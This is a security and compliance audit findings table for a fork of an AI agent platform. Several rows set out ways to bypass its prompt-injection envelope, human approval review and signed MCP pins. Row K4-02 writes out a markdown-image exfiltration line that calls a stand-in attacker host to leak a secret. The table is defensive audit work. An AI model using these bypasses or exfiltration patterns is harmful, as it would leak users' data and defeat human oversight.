| F4-23 | `badges.sh`'s UMP arm is satisfied by a **comment**: `grep -q 'UMP 1.0 / L3' ci.yml` still returns 1 after deleting the real gate line (the match is `ci.yml:540`'s comment), so both the badge and the loud "SELF-ATTESTED" degrade key off it. Neutered on a copy | LOW | **OPEN — UNROUTED.** Anchor the non-comment form. Pin `badges_ump_arm_reads_the_gate_not_its_comment` |
| K4-03 | **K9-01 is falsely CLOSED.** `scripts/fork/package-mac-app-gated.sh` has **zero call sites** (`rg` → the script + its README) and **zero tests** — the four `--gate-only` arms were drilled by hand. Three paths invoke upstream's packager directly (`package.json:1897`, `package-mac-dist.sh:200`, `restart-mac.sh:411`); `package-mac-dist.sh` is the worse one, because `:70` sets `BUNDLE_ID` without `.debug` and `package-mac-app.sh:116-120` blanks `SUFeedURL` **only** for `.debug` — so the **release** build embeds upstream's Ed25519 key and appcast with the gate never consulted. Secondary: the upstream-feed refusal is an exact string compare, so `…/refs/heads/main/appcast.xml` or any mirror passes | **HIGH** | **OPEN — UNROUTED** (was `CLOSED — fork lane`). The wrapper is correct; what is missing is its **caller** — the tenth pass's theme in one row. Fix: fork-side dist/package entry points that go through the wrapper; extend the refusal to a host-suffix match; assert the built `Info.plist`'s `SUPublicEDKey` ≠ upstream's constant |
| K4-01 | **K8-01, sharper.** `tool-results.ts:19-24` — `if (text.includes("EXTERNAL_UNTRUSTED_CONTENT")) return text;` — the double-wrap guard tests **the content being wrapped**, so any attacker-controlled byte disables the whole envelope (no `Source:`, no tag-block/bidi strip, no image strip) on exec stdout (`:23`), file reads (`:1151`), transcripts (`:74,127`). **Correction to the eighth pass:** three seams, not four — `pdf-tool.helpers.ts:168` calls `wrapExternalContent` directly and is unaffected, so the fix belongs in the helper alone. Its tests assert the **happy path only** | **HIGH** | **OPEN — UNROUTED** (narrowed from 4 seams to 3). Fix: anchor on the real framing (the shape already used at `web-search-output.ts:108`) or make the wrapper idempotent by construction |
| K4-05 | **Truthglass X-L1 is half-wired.** The embedded payload carries `args` (`approval.ts:255`), but `tui-plugin-approvals.ts:166-177` projects a `TuiPluginApproval` **without `args`** and `parseTuiPluginApproval` is the only parser — so the embedded/TUI reviewer sees `title` + `description`, both **plugin-authored prose**, and never the effective arguments. On that transport the approver reviews an unverifiable assertion: the exact Lies-in-the-Loop shape the round claims closed. No test covers the TUI render (0 `args` hits in that test file); the existing pin asserts **payload** parity only | MED | **OPEN — UNROUTED.** `TuiPluginApproval.request` is fork-local, so adding `args` is additive |
| K4-08 | **K9-03, confirmed and sharpened.** `link-reader-content.ts:31-43` re-emits raw `<img src>` for a standalone-`img` html_block and the purifier allows `img`+`src` — the **last ungated auto-fetch surface**, exfiltrating reader IP, the full `Referer`, and the operator's act of opening with **no config required**. This is also the measured **cost of the zero-conflict posture**: the fix requires editing an upstream-owned file, which is why it survived two passes | MED-HIGH | **OPEN — UNROUTED** (was `OPEN — fork lane`, MED). Fix: route the passthrough through the same pure gate; thread `remoteImageHosts` into `documentOptions` |
| K4-04 | The MCP catalog-pins "signed ack" verifies against **the public key carried in the file it protects** (`agent-bundle-mcp-catalog-pins.ts:270-299`). A standalone probe re-signed a forged body with a fresh keypair → **verifies true**: the rug-pulled fingerprint becomes the acknowledged baseline *silently*, which is strictly worse than the documented ceiling (which predicted a *flagged* downgrade). The only control that would matter — the agentDir mode check at `:170-181` — is `logWarn` | MED | **OPEN — UNROUTED.** Fix: pin the ack key in host config; treat a key mismatch as a loud rebuild. `forged_pins_rebuild_loudly` edits the **body** only, so its name over-promises |
| K4-02 | The fork's markdown-image strip (`external-content.ts:352`) is **inline-only**: reference-style `![a][r]` + `[r]: https://attacker/pixel?k=SECRET` and a raw `<img src>` both survive. Applies to **every** external source because the fork edited the shared sanitizer. *(Measured on the server seam for contrast: both ARE stripped there — the gap is fork-side only)* | MED-HIGH | **OPEN — UNROUTED.** Reference-definition pass + raw-tag pass, or `markdown-it` with `html:false` |
| K4-06 | The replay marking never fires on the turn it exists for: at `attempt-llm-boundary.ts:613,643,696` `preserveInboundMetadata` is true for the **current** user message — the very channel message being quoted — so `markReplayedMemoryOrigin` never runs on it; the CLI runner does not run it at all (0 refs) | MED | **OPEN — UNROUTED** (unregistered until now). Fix: apply it on the inbound channel path before prompt assembly |
| K4-07 | `before_agent_finalize` is a **second, uninstrumented** plugin→prompt text seam (`hooks.ts:1418` → `attempt-stream-prepare.ts:259`): `retry[].instruction` becomes the revise `reason` and a second model pass, never through `sanitizePluginContextSegment`. Zero register rows | MED | **OPEN — UNROUTED.** One import, one call site, on an upstream-owned file — record the merge cost honestly |
| K4-10 | The embedded runner builds the MCP-pins path by template literal (`attempt-bundle-tools.ts:157`) instead of `resolveCatalogPinsPath`, whose docstring promises traversal refusal — so the **default** runner is the one that skips the enforcement, and an empty `agentDir` silently yields no pins | LOW | **OPEN — UNROUTED** (unregistered). One-line fix; remove the asymmetry that makes the harness's fail-closed anchor test read as universal coverage |
| K4-11 | The hygiene seam ZWSP-splits **the fork's own brain recall fence** (`context-hygiene.ts:42-43,64-65`), so the live sentinel reaches the model with an invisible character inside it. Deliberate and defended in the header; recorded so the next reader sees the price, not just the choice | LOW | **DISCLOSED** — deliberate trade-off, no fix proposed |
| K4-12 | The fork's own installer hardcodes `repo_url="https://github.com/openclaw/openclaw.git"` (`install-cli.sh:1706`), so a fork operator following the install docs gets **upstream** — all 100 commits and every hardening silently absent, with a green install. K9-01 closed the *update* path and left the *install* path | LOW-MED | **OPEN — UNROUTED** (unregistered). Fix: a fork-side wrapper refusing an upstream URL — the same zero-conflict pattern accepted for the Sparkle gate |
| K4-09 | Any canonical-shaped `chrome-extension://` origin skips the pre-handshake origin gate (`verify-client.ts:169-172` + `origin-check.ts:93-97`), giving `allowedOrigins` a silent wildcard for a whole origin class. Bounded by downstream pairing | LOW-MED | **DISCLOSED** — bounded by pairing; restrict the pass-through to actually-paired origins |
| P4-01 | Four-tree parity: the invisible-Unicode set is consumed in **five** lanes (`src/strip_invisible.rs:143` via `include_str!`, `plugin/src/format.test.ts:3`, `client/src/main.rs`, `shell/tests/`, the fork host lane) — so `docs/audit8/05-parity-matrix.md:12`'s "ALIGNED — 3 of 4 pinned" is **stale**. But no workflow in this repo **executes** `plugin/src` tests | LOW | **ALREADY CLOSED** on coverage (the eighth pass's P8-01 rebuttal of its own premise was correct); the execution gap is F4-22/S9-07 |
| P4-02 | The attribute-tier grammar gap (F4-02) is inherited by the plugin/shell mirrors, and the fork's own sanitizer has no equivalent arm | HIGH | **OPEN — UNROUTED** — same fix as F4-02, plus the same canary family in `shell/src/lib/sanitize.ts` |
| P4-03 | Fork markdown-image coverage gaps on three surfaces (K4-02, K4-08) against a server seam that is **clean** — measured both directions | MED-HIGH | **OPEN — UNROUTED** (K4-02 / K4-08) |
| P4-04 | The fence sentinel is ZWSP-split in the composed prompt and the replay marker is inert on the live turn (K4-11, K4-06) | MED | **OPEN — UNROUTED** |
| P4-05 | `untrusted:true` parity is complete in-repo (8 server files, 7 plugin files) but the fork's MCP envelope is skippable (K4-01) | HIGH | **OPEN — UNROUTED** (K4-01) |
| P4-07 | Token handling: the ladder is 3 rungs, 2 hardened, the live one unguarded (F4-01) | **CRITICAL** | **CLOSED — R82** with F4-01: the ladder is 3 rungs, 3 hardened; the production rung carries the multi-token refusal (`c78f3984`) and its pin executes in the fork's vitest runner, red-proven |
| L4-01 | **CT PA 26-15 §15**, in force **2026-10-01** — five days before this audit — requires covered providers to embed **C2PA-consistent** provenance. The map records nothing and `src/provenance.rs:26-28` says *"NOT C2PA"*. The statute was read from `cga.ct.gov`, which **closes this repo's own L9-16 "text-unverified" gap** | **HIGH** | **OPEN — UNROUTED.** Needs an operator-decision row (is the deployer a covered provider?) before any code |
| L4-02 | **CA SB1000** (Stats. 2026 Ch. 861, signed 2026-09-30) **replaced** the detection tool the map's CA row instructs building with a disclosure-**verification** tool, and deleted the 1M-user covered-provider threshold. The repo's remediation instruction was obsolete six days after it was written | **HIGH** | **OPEN — UNROUTED.** Correct the CA row first; the code question is downstream of it |
| L4-15 | All four CRA Art 14 clocks are **correct** (verified), but the runbook assigns **manufacturer/importer/distributor** duties to the **self-hosting operator**, who is not a manufacturer — so a single-operator deployment reads duties it does not owe and omits those it does | **HIGH** | **OPEN — UNROUTED.** Rewrite the runbook's duty table around the operator's actual role |
| L4-05 | `dsar_deadline` is labelled *"Art 17 erasure deadline"*; **Art 17 has no deadline** — it is **Art 12(3)**, and it runs from *supervisory-authority receipt*, not from the request | MED | **OPEN — UNROUTED.** Relabel the constant; the operator-settable window can exceed the statutory clock |
| L4-03 | The Code-of-Practice citation is the wrong article: **Art 95** is voluntary codes of conduct for *non-high-risk* systems; the GPAI CoP is **Art 56** | MED | **OPEN — UNROUTED.** Citation correction + a provenance-discipline pin |
| T4-01 | `COMPLIANCE.md:680` states PHI is tokenized *"at the write boundary"* / *"not raw PHI"*. `src/gate.rs:315-327` states verbatim that the scanner **re-runs over stored text** and there is *"**no** write-time PII placeholder vault"*; `redact_content` returns **full text** for loopback/`None` principals (`:317-318,332`) — so the HIPAA "minimum necessary" row is **vacuous in the exact posture the repo markets** | **HIGH** | **OPEN — UNROUTED.** Either implement the write-boundary vault or state the read-time truth in the table; the current sentence is the wrong one |
| T4-07 | The export-controls sweep is a **false negative**: the Federal Register API returns **90 FR 4544** for ECCN `4E091` (model weights). The map asserts *"no BIS model-weights rule"* | HIGH | **OPEN — UNROUTED.** Re-run the sweep; the conclusion, not just the row, is wrong |
| T4-03 | `well_known.rs:151` says the service *"generates no content"*; `:166` (`ai-notice`) says it *"may return content that is **AI-generated**"*. Art 50(2) binds providers **generating synthetic content** — brain-server generates none, so the duty likely does **not** bind it and `reg_watch.rs:100`'s clock points at the wrong target. Meanwhile all four `MARK_AIGEN` classes are **deterministic serializations** (`workflow.rs:2055,2108`, `kb.rs:833`) — a signed claim of AI authorship on human content | HIGH | **OPEN — UNROUTED.** Reconcile the two notices; decide whether the marks should claim AI authorship at all |
| T4-09 | The "quarterly pass BLOCKED" note was a **sandbox artefact** — NCSL was reachable during this pass (though still 403 from this host, so the BLOCKED note itself is honest; only its *conclusion* was wrong) | MED | **OPEN — UNROUTED.** Run the drift check; a stale map that blames the network is worse than no map |
| T4-20 | This charter repeated T9-01's own defect (stale §1 baseline + colliding deliverable filename), re-issued from the same template | LOW | **CLOSED — this audit** (renamed `…_TENTH_PASS.md`, re-measured baseline). **The class is NOT closed:** the fix was applied to one charter, and `.gitignore` lists each audit report **explicitly**, so a new report is uncovered by the existing lines — writing one without a matching `.gitignore` edit would ship a private report with the next tag (R77's privacy failure, re-armed) |
| T4-19 | Superseded: this pass initially reported the committed SBOM as contradicting `Cargo.lock` (MED). **Re-measured and OVERTURNED** — with a multi-version-aware comparison (the lock legitimately holds several versions of one crate; my first method collapsed them and produced 11 phantom mismatches), `sbom/brain-server-1.29.3.cdx.json` shows **335 components, 335 version matches, 0 mismatches, 0 absent**; the 122 lock packages outside it are the dev/build tree, which the release checklist already discloses. Downgraded to: archived SBOMs accumulate (25+ files) and no gate compares *content* | INFO | **DISCLOSED** — recorded as a self-correction, because a number nobody diffed against a measurement is this repo's own standing lesson |
